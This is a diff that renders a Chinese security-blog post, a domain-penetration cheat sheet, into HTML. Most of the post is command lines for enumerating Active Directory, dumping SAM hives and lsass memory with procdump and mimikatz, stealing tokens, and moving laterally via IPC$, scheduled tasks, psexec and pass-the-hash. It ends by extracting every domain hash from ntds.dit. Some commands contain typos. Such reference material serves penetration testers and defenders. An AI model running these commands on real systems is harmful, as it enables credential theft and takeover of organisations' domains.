@@ -1,16 +1,444 @@
-{% extends '_layout.njk' %}
-{% import '_macro/sidebar.njk' as sidebar_template with context %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
 
-{% block title %}{{ page.title }} | {{ title }}{% endblock %}
 
-{% block class %}post posts-expand{% endblock %}
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-{% block content %}
+<link rel="stylesheet" href="/css/main.css">
 
-  {{ partial('_macro/post.njk', {post: page}) }}
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h0sec.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+  <meta name="description" content="域渗透的一般流程： 入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控  一、域信息收集1、net net user &#x2F;domain  获取域用户列表net group. &quot;domain admins&quot; &#x2F;doamin  获取域管理员列表net group &quot;domain controlle">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="域渗透知识备忘">
+<meta property="og:url" content="https://h0sec.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html">
+<meta property="og:site_name" content="T的网络日志">
+<meta property="og:description" content="域渗透的一般流程： 入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控  一、域信息收集1、net net user &#x2F;domain  获取域用户列表net group. &quot;domain admins&quot; &#x2F;doamin  获取域管理员列表net group &quot;domain controlle">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-26T08:51:05.000Z">
+<meta property="article:modified_time" content="2021-04-14T06:13:20.539Z">
+<meta property="article:author" content="T">
+<meta property="article:tag" content="Penetration">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://h0sec.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://h0sec.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html","path":"2020/域渗透知识备忘.html","title":"域渗透知识备忘"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>域渗透知识备忘 | T的网络日志</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="T的网络日志" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">T的网络日志</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">一、域信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">二、域渗透思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81-%E6%9C%AC%E5%9C%B0"><span class="nav-number">2.1.</span> <span class="nav-text">2.1、注册表读取密码-本地</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2%E3%80%81lsass%E8%BF%9B%E7%A8%8B%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98hash"><span class="nav-number">2.2.</span> <span class="nav-text">2.2、lsass进程读取内存hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3%E3%80%81LaZagne%E5%8F%96%E5%90%84%E7%A7%8D%E8%BF%9E%E6%8E%A5%E5%B7%A5%E5%85%B7%E5%AF%86%E7%A0%81%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%9D%E5%AD%98%E5%AF%86%E7%A0%81%E7%AD%89"><span class="nav-number">2.3.</span> <span class="nav-text">2.3、LaZagne取各种连接工具密码，浏览器保存密码等</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4%E3%80%81%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96"><span class="nav-number">2.4.</span> <span class="nav-text">2.4、凭证窃取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B8%97%E9%80%8F-IPC%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.5.</span> <span class="nav-text">2.5、命令行渗透-IPC连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-6%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B8%97%E9%80%8F-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">2.6.</span> <span class="nav-text">2.6、命令行渗透-计划任务执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-7%E3%80%81%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B8%97%E9%80%8F-psexec-exe"><span class="nav-number">2.7.</span> <span class="nav-text">2.7、命令行渗透-psexec.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-8%E3%80%81%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="nav-number">2.8.</span> <span class="nav-text">2.8、获取内网代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81Windows-api-%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">三、Windows api 利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%AF%BC%E5%9F%9FHASH"><span class="nav-number">4.</span> <span class="nav-text">四、导域HASH</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="T"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">T</p>
+  <div class="site-description" itemprop="description">网络安全、渗透测试、编程语言、Writeup，随便写写，记录一些东西</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:root#h0sec.com" title="E-Mail → mailto:root#h0sec.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/about/" title="About → &#x2F;about&#x2F;"><i class="address-card fa-fw"></i>About</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/images/qcode.jpg" title="Wechat → &#x2F;images&#x2F;qcode.jpg"><i class="weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://h0sec.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="T">
+      <meta itemprop="description" content="网络安全、渗透测试、编程语言、Writeup，随便写写，记录一些东西">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="T的网络日志">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          域渗透知识备忘
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-04-26 16:51:05" itemprop="dateCreated datePublished" datetime="2020-04-26T16:51:05+08:00">2020-04-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>域渗透的一般流程：</p>
+<p>入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控 </p>
+<h3 id="一、域信息收集"><a href="#一、域信息收集" class="headerlink" title="一、域信息收集"></a>一、域信息收集</h3><p><strong>1、net</strong></p>
+<p><code>net user /domain</code>  获取域用户列表<br><code>net group. &quot;domain admins&quot; /doamin</code>  获取域管理员列表<br><code>net group &quot;domain controllers&quot; /domain </code>  查看域控制器(如果有多台)<br><code>net group &quot;domail computers&quot; /domain</code>  查看域机器<br><code>net group /domain</code>  查询域里面的组<span id="more"></span></p>
+<p><code>net view</code>  查看同一域内机器列表<br><code>net view \\ip</code>  查看某IP共享<br><code>net view \\GHQ</code>  查看GHQ计算机的共享资源列表<br><code>net view /domain</code>  查看内网存在多少个域<br><code>net view /domain:XYZ</code>  查看XYZ域中的机器列表</p>
+<p><strong>2、nltest信任域</strong></p>
+<p>查询域间的信任关系<br><code>nettles  /domain_trusts /all_trusts /v /server:192.168.52.2</code><br>返回所有信任192.168.52.2的域</p>
+<p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code><br>返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p>
+<p>nltest的命令：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dreamer-fish/p/3473895.html">https://www.cnblogs.com/dreamer-fish/p/3473895.html</a></p>
+<p><strong>3、nbtscan.exe</strong></p>
+<p>扫描网段内是否存在域内机器</p>
+<p><code>nbtscan.exe 192.168.52.0/24</code></p>
+<p><strong>4、csvde</strong></p>
+<p>csvde是windows server 2008的内置命令行工具，如果安装了AD DS或Active Directory轻型目录服务，则功能可用<br><code>csvde -setspn hack -f c:\windows\temp\hack.csv</code><br>LDAP的存储规则：<br>区分名(DN)：一个条目的区分名叫做‘dn’，在一个目录中这个名称总是唯一的<br>CN&#x3D;Common Name为用户名或服务器名，最长可以到80个字符，可以为中文<br>OU&#x3D;Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文<br>O&#x3D;Organization 为组织名，可以3-64个字符长<br>C&#x3D;Country为国家名，可选，为2个字符长</p>
+<p><strong>5、setspn</strong></p>
+<p><code>setspn -T 域名 -Q */*</code></p>
+<ul>
+<li>SPN官方名称即“服务主体名称”，本质上存的是域内各种服务资源的对应关系</li>
+<li>如，对应的服务类型是什么，机器名是什么，服务端口是多少</li>
+<li>借助SPN可以快速定位当前目标域中所有存活的各类服务器</li>
+</ul>
+<p>例如查找mssql服务器<br><code>setspn -T 域名 -Q */* | findstr MSSQL</code></p>
+<p><strong>6、dnsdump.exe</strong></p>
+<p>获取域名其对应的IP地址<br><code>dnsdump.exe -u 域名/域用户 -p 域密码 域控机器名 -r</code></p>
+<h3 id="二、域渗透思路"><a href="#二、域渗透思路" class="headerlink" title="二、域渗透思路"></a>二、域渗透思路</h3><h4 id="2-1、注册表读取密码-本地"><a href="#2-1、注册表读取密码-本地" class="headerlink" title="2.1、注册表读取密码-本地"></a>2.1、注册表读取密码-本地</h4><p>​    <strong>1、获取注册表信息</strong>：<br><code>reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</code><br><code>reg save HKLM\SAM c:\windows\temp\Sam.hiv</code></p>
+<p>​    <strong>2、mimikatz解密</strong><br><code>lsadump::sam /sam:Sam.hiv /system:Sys.hiv</code></p>
+<h4 id="2-2、lsass进程读取内存hash"><a href="#2-2、lsass进程读取内存hash" class="headerlink" title="2.2、lsass进程读取内存hash"></a>2.2、lsass进程读取内存hash</h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p>
+<p>​    <strong>1、目标机执行procdump.exe</strong><br><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p>
+<p>​    <strong>2、mimikatz中运行,结果保存在日志里</strong><br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
+<h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+<h4 id="2-4、凭证窃取"><a href="#2-4、凭证窃取" class="headerlink" title="2.4、凭证窃取"></a>2.4、凭证窃取</h4><p>通过tasklist &#x2F;v查看进程用户，如果有域用户开启的进程，则窃取凭证</p>
+<p><code>incognito.exe list_tokens -u</code>  查看目标机当前存储那些凭证<br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code>  使用域用户administrator凭证开启一个cmd</p>
+<h4 id="2-5、命令行渗透-IPC连接"><a href="#2-5、命令行渗透-IPC连接" class="headerlink" title="2.5、命令行渗透-IPC连接"></a>2.5、命令行渗透-IPC连接</h4><p>为什么命令后渗透？？<br>1、远程登录桌面增加暴漏风险<br>2、目标管理员可能对服务器禁用远程登录</p>
+<ul>
+<li>建立ipc连接<br>可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令上传和下载文件直接通过copy命令就可以，<br>不过路径换成UNC路径。以\开头的路径就是UNC路径，比如\192.168.1.1\c$\users</li>
+</ul>
+<p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code><br>例如：<code>net use \\192.168.1.1 /u:hack\administrator  1q2w3</code></p>
+<ul>
+<li>第二步：上传&#x2F;下载文件<br>例如：从本地上传1.bat到192.168.1.1机器C盘根目录下<br><code>copy 1.bat \\192.168.1.1\C$\</code></li>
+</ul>
+<p> dir、copy、xcopy、move、type的参数都可以使用UNC路径</p>
+<h4 id="2-6、命令行渗透-计划任务执行命令"><a href="#2-6、命令行渗透-计划任务执行命令" class="headerlink" title="2.6、命令行渗透-计划任务执行命令"></a>2.6、命令行渗透-计划任务执行命令</h4><ul>
+<li><p>创建计划任务<br><code>schtasks /create /tn 任务名 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</code></p>
+</li>
+<li><p>执行计划任务</p>
+<p><code>schtasks /run /tn 任务名 /s 域机器IP /U 域\域用户 -P 域用户密码</code></p>
+</li>
+<li><p>删除计划任务</p>
+<p><code>schtasks /F /delete /tn 任务名 /s 域机器IP /U 域\域用户 /P 域用户密码</code></p>
+</li>
+</ul>
+<p>例如：在192.168.1.1上建立task1任务（以system权限执行cmd程序）<br><code>schtasks /create /tn task1 /U hack\administrator /P 1q2w3e -tr &quot;c:\windows\system32\cms.exe /c whoami &gt; c:\\windows\\temp\\1.txt&quot; /sc ONSTART /s 192.168.1.1 /RU system</code></p>
+<h4 id="2-7、命令行渗透-psexec-exe"><a href="#2-7、命令行渗透-psexec-exe" class="headerlink" title="2.7、命令行渗透-psexec.exe"></a>2.7、命令行渗透-psexec.exe</h4><p><strong>知道域账号密码</strong></p>
+<ul>
+<li><p>建立IPC连接</p>
+<p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code></p>
+</li>
+<li><p>执行命令</p>
+<p><code>psexec.exe \\192.168.1.1 -s cmd.exe -accepteula</code><br>-accepteula第一次运行回弹框，输入这个参数便不会弹框；-s 以“nt authority\system”权限运行远程进程</p>
+</li>
+</ul>
+<p><strong>不知明文域账号密码，hash传递</strong></p>
+<p><code>psexec_hash.exe -hashes :用户hash 域名\用户名@目标IP</code></p>
+<h4 id="2-8、获取内网代理"><a href="#2-8、获取内网代理" class="headerlink" title="2.8、获取内网代理"></a>2.8、获取内网代理</h4><p>内网中有些资源可能需要挂指定<code>代理</code>才能进行访问，一般是<code>IE</code>代理或<code>PAC</code>代理，这两个代理可以通过注册表来读取。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、Windows-api-利用"><a href="#三、Windows-api-利用" class="headerlink" title="三、Windows api 利用"></a>三、Windows api 利用</h3><p>以下所有利用工具的前提都是已经<code>建立IPC连接</code></p>
+<table>
+<thead>
+<tr>
+<th align="left">工具名称</th>
+<th align="left">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">NetGroupGetUsers.exe</td>
+<td align="left">查询域里的各个组里的成员，IP必须是域控IP，域用户随意</td>
+</tr>
+<tr>
+<td align="left">NetLocalGroupGetMembers.exe</td>
+<td align="left">查询目标服务器本地管理组的成员</td>
+</tr>
+<tr>
+<td align="left">NetUserEnum.exe</td>
+<td align="left">查询目标服务器所有用户，包括隐藏用户</td>
+</tr>
+</tbody></table>
+<p>命令用法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NetGroupGetUsers.exe &quot;domain users&quot; \\192.168.52.2</span><br><span class="line">NetLocalGroupGetMembers.exe \\192.168.52.2</span><br><span class="line">NetUserEnum.exe \\192.168.52.2</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、导域HASH"><a href="#四、导域HASH" class="headerlink" title="四、导域HASH"></a>四、导域HASH</h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p>
+<p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx">官方文档</a>，首先我们要创建一个快照：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; creat quit quit</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们挂载快照：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;快照id&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们复制<code>ntds.dit</code>到本地：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 装载位置\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们解除挂载：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;快照id&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p>最后删除快照：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;delete &#123;快照id&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br><span class="line">NTDSDdumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/images/wechatqcode.png">
+          <span class="icon">
+            <i class="wechat"></i>
+          </span>
+
+          <span class="label">WeChat</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Penetration/" rel="tag"># Penetration</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html" rel="prev" title="docker常用命令">
+                  <i class="fa fa-chevron-left"></i> docker常用命令
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/%E9%80%9A%E8%BE%BEOA1.html" rel="next" title="通达OA 任意用户登录漏洞复现">
+                  通达OA 任意用户登录漏洞复现 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">T</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
